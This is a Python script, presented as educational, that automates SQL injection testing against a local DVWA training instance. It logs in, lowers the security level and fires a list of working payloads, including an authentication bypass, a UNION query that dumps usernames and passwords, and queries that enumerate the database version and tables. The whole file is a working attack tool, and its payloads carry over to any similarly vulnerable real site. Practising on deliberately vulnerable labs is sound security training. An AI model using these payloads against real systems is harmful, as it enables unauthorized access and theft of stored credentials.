"""
SQL Injection Payload Tester for DVWA
--------------------------------------
Educational script that automates testing of common SQL injection
payloads against a locally hosted DVWA instance.

WARNING: Use only on your own local DVWA installation.
Never run against systems you do not own or have written permission to test.
"""

import requests

# --- Configuration ---
TARGET_URL = "http://localhost/dvwa/vulnerabilities/sqli/"
LOGIN_URL  = "http://localhost/dvwa/login.php"
USERNAME   = "admin"
PASSWORD   = "password"

PAYLOADS = [
    ("Basic quote test",         "'"),
    ("Always-true bypass",       "1' OR '1'='1"),
    ("Extract all users",        "1' OR 1=1-- -"),
    ("UNION: dump credentials",  "1' UNION SELECT user, password FROM users-- -"),
    ("DB version info",          "1' UNION SELECT version(), database()-- -"),
    ("List all tables",          "1' UNION SELECT table_name, 2 FROM information_schema.tables-- -"),
]


def login(session):
    """Log into DVWA, handling the CSRF token."""
    r = session.get(LOGIN_URL)
    token = r.text.split("user_token' value='")[1].split("'")[0]
    data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token,
    }
    r = session.post(LOGIN_URL, data=data)
    if "Welcome" in r.text or "index.php" in r.url:
        print("[+] Login successful")
        return True
    print("[-] Login failed — check credentials and that DVWA is running")
    return False


def set_security_low(session):
    """Set DVWA security level to LOW for testing."""
    url = "http://localhost/dvwa/security.php"
    session.post(url, data={"security": "low", "seclev_submit": "Submit"})
    print("[+] Security level set to LOW")


def test_payloads(session):
    """Run each payload and report what happened."""
    print("\n" + "=" * 60)
    print(" SQL INJECTION PAYLOAD TESTER - DVWA")
    print("=" * 60)

    for name, payload in PAYLOADS:
        print(f"\n[*] Testing: {name}")
        print(f"    Payload: {payload}")
        params = {"id": payload, "Submit": "Submit"}
        r = session.get(TARGET_URL, params=params)

        text = r.text.lower()
        if "syntax" in text:
            print("    Result : SQL syntax error — field is injectable")
        elif "first name" in text:
            count = text.count("first name")
            print(f"    Result : Data extracted ({count} record(s) returned)")
        elif "error" in text:
            print("    Result : Error in response")
        else:
            print("    Result : Unexpected response — inspect manually")

    print("\n" + "=" * 60)
    print("[+] Testing complete")
    print("=" * 60)


def main():
    session = requests.Session()
    session.cookies.set("PHPSESSID", "dvwa", domain="localhost")
    if login(session):
        set_security_low(session)
        test_payloads(session)


if __name__ == "__main__":
    main()
